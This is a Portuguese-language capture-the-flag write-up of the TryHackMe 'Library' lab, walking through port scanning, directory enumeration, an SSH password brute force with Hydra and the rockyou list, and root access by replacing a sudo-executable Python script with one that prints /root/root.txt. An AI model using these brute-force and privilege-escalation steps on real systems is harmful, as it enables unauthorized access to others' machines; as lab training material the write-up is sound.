---
title: 'TryHackMe: Library'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Rustscan, Nmap, Feroxbuster, Hydra]
image:
  path: assets/images/tryhackme/library/image.png
---

Boa tarde! Mais um desafio do site tryhackme para nós completarmos como verdadeiros hackers :p

Vamos começar com um rustscan em todas as portas:

```
rustscan -a 10.10.16.131 -r 0-65535 -- -A
```

A saída basicamente nos diz que a porta 22 e 80 estão abertas então vamos começar com a 80.

Colocando o ip no navegador nós temos um site muito simples com um formulário que não funciona. As outras páginas não redirecionam para nenhum lugar.

![alt text](assets/images/tryhackme/library/img1.png)

Sem muitas pistas, vamos fazer uma enumeração com feroxbuster:

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.16.131 --wordlist /usr/share/wordlists/dirb/big.txt  
```

A rota mais interessante é /robots.txt, acessando ela temos:

![alt text](assets/images/tryhackme/thompson/img2.png)

Existe um arquivo famoso chamado rockyou que basicamente é um compilado de várias senhas vazadas no meio hacker, seguindo essa pista vamos fazer brute force no SSH com hydra e usuário meliodas (encontrado na página)

```
`┌──(kali㉿kali)-[~]
└─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.16.131:22
```

Descobrindo a senha do meliodas vamos entrar na máquina:

```
ssh meliodas@10.10.16.131
ls
cat user.txt
```

Aqui está o pulo do gato, usando o comando sudo -l para vermos o que podemos executar podemos perceber que nós podemos executar o comando bak.py que tem um código python dentro dele. precisamos substituir esse código pelo nosso mas não temos permissão de alterar o arquivo pois não somos donos dele. Porém o meliodas é dono do diretório então podemos remover o arquivo e criar outro.

```
rm -rf bak.py
nano bak.py
```

colocamos o seguinte código:

```
# -*- coding: utf-8 -*-
import os

# Caminho do arquivo
arquivo_origem = os.path.expanduser('../../../../root/root.txt')

# Abrindo e imprimindo o conteúdo do arquivo
with open(arquivo_origem, 'r', encoding='utf-8') as arquivo:
    print(arquivo.read())
```

e aí executamos com o comando:

```
sudo /usr/bin/python3 /home/meliodas/bak.py
```

e obtemos a chave.

![alt text](assets/images/tryhackme/thompson/img3.png)